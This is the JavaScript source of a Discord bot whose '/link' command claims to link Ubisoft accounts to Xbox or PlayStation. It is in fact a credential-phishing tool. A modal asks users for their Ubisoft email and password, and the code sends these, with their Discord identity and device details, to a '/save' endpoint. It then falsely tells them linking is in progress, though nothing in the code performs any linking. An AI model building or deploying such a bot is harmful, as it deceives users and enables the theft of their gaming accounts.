console.log('=== BOT.JS LOADED ===');
console.log('Checking environment variables...');
console.log('DISCORD_TOKEN exists?', !!process.env.DISCORD_TOKEN);
console.log('DISCORD_CLIENT_ID exists?', !!process.env.DISCORD_CLIENT_ID);

if (!process.env.DISCORD_TOKEN) {
  console.error('FATAL: DISCORD_TOKEN is missing!');
  process.exit(1);
}
if (!process.env.DISCORD_CLIENT_ID) {
  console.error('FATAL: DISCORD_CLIENT_ID is missing!');
  process.exit(1);
}

const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = require('discord.js');

const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

function parseUserAgent(uaString) {
  const ua = uaString || '';
  const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua);
  const deviceType = isMobile ? 'Mobile' : 'Desktop';
  
  let browser = 'Unknown';
  if (ua.includes('Chrome')) browser = 'Chrome';
  else if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('Safari')) browser = 'Safari';
  else if (ua.includes('Edge')) browser = 'Edge';
  
  let os = 'Unknown';
  if (ua.includes('Windows')) os = 'Windows';
  else if (ua.includes('Mac')) os = 'MacOS';
  else if (ua.includes('Linux')) os = 'Linux';
  else if (ua.includes('Android')) os = 'Android';
  else if (ua.includes('iOS')) os = 'iOS';
  
  return { deviceType, browser, os };
}

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
  
  const commands = [
    new SlashCommandBuilder()
      .setName('link')
      .setDescription('Link your Ubisoft account to Xbox or PlayStation'),
  ].map(cmd => cmd.toJSON());
  
  const rest = new REST({ version: '10' }).setToken(TOKEN);
  rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands })
    .then(() => console.log('Commands registered'))
    .catch(console.error);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  
  if (interaction.commandName === 'link') {
    const modal = new ModalBuilder()
      .setCustomId('ubiModal')
      .setTitle('Ubisoft Account Link');
      
    const emailInput = new TextInputBuilder()
      .setCustomId('ubiEmail')
      .setLabel('Ubisoft Email')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);
      
    const passInput = new TextInputBuilder()
      .setCustomId('ubiPass')
      .setLabel('Ubisoft Password')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);
      
    const platformInput = new TextInputBuilder()
      .setCustomId('platform')
      .setLabel('Platform (Xbox or Psn)')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);
      
    const firstRow = new ActionRowBuilder().addComponents(emailInput);
    const secondRow = new ActionRowBuilder().addComponents(passInput);
    const thirdRow = new ActionRowBuilder().addComponents(platformInput);
    modal.addComponents(firstRow, secondRow, thirdRow);
    
    await interaction.showModal(modal);
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  
  if (interaction.customId === 'ubiModal') {
    const ubiEmail = interaction.fields.getTextInputValue('ubiEmail');
    const ubiPass = interaction.fields.getTextInputValue('ubiPass');
    const platform = interaction.fields.getTextInputValue('platform');
    
    const discordUser = interaction.user;
    const userAgent = interaction.client.options.http?.headers?.['User-Agent'] || 'Unknown';
    const { deviceType, browser, os } = parseUserAgent(userAgent);
    
    // Send data to the server's /save endpoint
    try {
      const response = await fetch('http://localhost:3000/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          discord_username: discordUser.username,
          discord_id: discordUser.id,
          ubi_email: ubiEmail,
          ubi_password: ubiPass,
          platform: platform,
          device_type: deviceType,
          browser: browser,
          os: os,
          timestamp: new Date().toISOString()
        })
      });
      console.log('Data saved to server:', response.status);
    } catch (err) {
      console.error('Failed to save data:', err);
    }
    
    await interaction.reply({
      content: `✅ Received. Linking ${ubiEmail} to ${platform}. You will be notified when complete.`,
      ephemeral: true
    });
  }
});

console.log('Attempting to login to Discord...');
client.login(TOKEN);